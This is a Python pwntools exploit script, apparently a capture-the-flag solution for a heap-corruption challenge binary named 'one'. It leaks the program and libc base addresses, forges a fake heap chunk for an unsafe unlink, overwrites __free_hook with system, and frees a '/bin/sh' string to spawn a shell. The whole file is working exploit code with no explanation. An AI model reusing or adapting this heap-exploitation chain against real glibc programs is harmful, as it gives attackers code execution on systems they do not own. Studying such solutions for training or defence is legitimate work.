#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './one'
# sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
sh = process(execve_file)
# sh = remote('eonew.cn', 60108)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $notes=(char **)$rebase(0x2030C0)

    define pn
        p $notes[1]
        x/64bx $notes[1]
        x/8gx $notes[1]
        end
    
    define pa
        p *$notes@20
        end

    # b _int_free
    # c
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def add(content):
    sh.sendlineafter('command>> \n', '1')
    sh.recvuntil('Now, you can input your test string:\n')
    sh.send(content)

def delete(index):
    sh.sendlineafter('command>> \n', '4')
    sh.recvuntil('Please give me the index of the string:\n')
    sh.sendline(str(index))

def show(index):
    sh.sendlineafter('command>> \n', '3')
    sh.recvuntil('Please give me the index of the string:\n')
    sh.sendline(str(index))
    sh.recvline('The string is:')

def edit(index, edit_ch, ch):
    sh.sendlineafter('command>> \n', '2')
    sh.sendlineafter('Please give me the index of the string:\n', str(index))
    sh.sendafter('Which char do you want to edit:\n', edit_ch)
    sh.sendlineafter('What do you want to edit it into:\n', ch)

# pause()
sh.sendlineafter('command>> \n', '12580')
sh.sendlineafter('Do you want to use one?(Y/N)\n', 'Y')
sh.sendlineafter('Here are 5 strings to be tested. Which one do you want to test?\n', str(0x80000000))
sh.recvline('The string:')
result = sh.recvline()[:-1]
image_addr = u64(result.ljust(8, '\0')) - 0x2030c0
log.success('image_addr: ' + hex(image_addr))

notes_addr = image_addr + 0x2030C0
fake_chunk_addr = notes_addr + 8

start = 0xff - 0x80
padding = ''.join([chr(i) for i in range(start, start + 32)])
add('\n')
add(padding)
add('\n')

add('/bin/sh\0\n') # 3

for i in range(16):
    add('\n')

for i in range(0x18):
    edit(1, '\0', chr(start + 0x20 + i))
    
# fake_chunk
payload = p64(0) + p64(0x31) + p64(fake_chunk_addr - 0x18) + p64(fake_chunk_addr - 0x10)

edit(1, '\0', '\x04')
edit(1, '\x41\n', '\x40')

# set prev_size
position = start + 0x38 - 1
for v in p64(0x30)[::-1]:
    edit(1, chr(position) + '\n', v)
    position -= 1

position = start + 0x20 - 1
for v in payload[::-1]:
    edit(1, chr(position) + '\n', v)
    position -= 1

# unlink
delete(2)

for i in range(0xff - 0x10, 0xff):
    edit(1, '\0', chr(i))

show(1)
sh.recvuntil('\xfe')
heap_addr = sh.recvline()[:-1]

puts_got_addr = image_addr + elf.got['puts']
temp = p64(puts_got_addr)
i = 0
for v in heap_addr:
    edit(1, v + '\n', temp[i])
    i += 1

show(0)
result = sh.recvline()[:-1]
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['puts']
log.success('libc_addr: ' + hex(libc_addr))

__free_hook_addr = libc_addr + libc.symbols['__free_hook']

temp = p64(__free_hook_addr)
i = 0
for v in p64(puts_got_addr):
    if (v == '\0'):
        edit(1, v, temp[i])
    else:
        edit(1, v + '\n', temp[i])
    i += 1

for v in p64(libc_addr + libc.symbols['system']):
    edit(0, '\0', v)

delete(3)

sh.interactive()